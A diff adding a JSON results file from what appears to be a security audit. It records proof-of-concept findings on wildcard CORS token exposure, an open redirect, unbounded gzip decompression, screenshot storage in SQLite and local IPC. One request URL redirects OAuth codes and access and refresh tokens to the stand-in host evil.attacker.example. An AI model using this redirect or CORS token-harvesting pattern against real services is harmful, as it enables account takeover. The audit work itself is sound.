@@ -1,0 +1,82 @@
+{
+  "poc1_corsAndZeroAuthExfiltration": {
+    "originSent": "https://evil.attacker.example",
+    "authorizationHeaderSent": null,
+    "preflight": {
+      "status": 204,
+      "accessControlAllowOrigin": "*",
+      "accessControlAllowMethods": "GET,HEAD,PUT,POST,DELETE,PATCH,QUERY"
+    },
+    "endpoints": {
+      "/v2/dictation/gemini-token": {
+        "status": 200,
+        "corsHeader": "*",
+        "returnsTokenField": true,
+        "tokenLength": 26,
+        "isFallbackPlaceholder": false
+      },
+      "/deepgram/token": {
+        "status": 200,
+        "corsHeader": "*",
+        "returnsTokenField": true,
+        "tokenLength": 25,
+        "isFallbackPlaceholder": false
+      },
+      "/realtime/token": {
+        "status": 200,
+        "corsHeader": "*",
+        "returnsClientSecret": true,
+        "secretLength": 23
+      },
+      "/memory": {
+        "status": 200,
+        "corsHeader": "*",
+        "leakedMemoryChars": 0,
+        "leakedVersion": null
+      },
+      "/agent/integrations": {
+        "status": 200,
+        "corsHeader": "*",
+        "leakedCount": 7
+      }
+    }
+  },
+  "poc2_openRedirectTokenLeak": {
+    "requestUrl": "/auth/v1/authorize?redirect_to=https%3A%2F%2Fevil.attacker.example%2Fcallback&state=csrf_test",
+    "status": 302,
+    "locationHeader": "https://evil.attacker.example/callback?code=kursor_local_code&state=csrf_test&access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDEiLCJlbWFpbCI6ImxvY2FsQGt1cnNvci5kZXYiLCJyb2xlIjoiYXV0aGVudGljYXRlZCIsImF1ZCI6ImF1dGhlbnRpY2F0ZWQiLCJpYXQiOjE3OTQ1NzM5MDIsImV4cCI6MTgyNjEwOTkwMn0.a3Vyc29yLWxvY2FsLWRldi1zaWduYXR1cmU&refresh_token=kursor_rt_MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAxOjE3OTQ1NzM5MDI&token_type=bearer&expires_in=31536000",
+    "redirectsToExternalHost": true,
+    "leaksAccessTokenInQuery": true,
+    "leaksRefreshTokenInQuery": true
+  },
+  "poc3_gzipMiddleware": {
+    "status": 200,
+    "compressedBytesSent": 54,
+    "usesUnboundedGunzipSync": true,
+    "maxOutputLengthConfigured": false
+  },
+  "poc4_sqliteBase64ScreenshotPersistence": {
+    "sessionId": "audit-privacy-img-1794573902367",
+    "screenshotDataUrlLength": 50447,
+    "storedInSqliteThreadsTable": true,
+    "storedMessagesJsonBytes": 50605,
+    "containsRawBase64ImageInSqlite": true
+  },
+  "poc5_singleInstanceAndBrowserBridge": {
+    "singleInstanceIpc": {
+      "mmfPattern": "Local\\HeyClicky-<SID>-primary",
+      "mutexPattern": "Local\\HeyClicky-<SID>-primary-mutex",
+      "defaultAclAllowsSameUserWrite": true,
+      "maxPayloadBytes": 1048576,
+      "discoveredPipes": []
+    },
+    "browserBridgeCheck": {
+      "exists": true,
+      "port": 51635,
+      "tokenLength": 64,
+      "tokenPrefix": "01abdb...",
+      "unauthError": "The operation was aborted due to timeout",
+      "authWithDiskTokenError": "The operation was aborted due to timeout"
+    }
+  }
+}
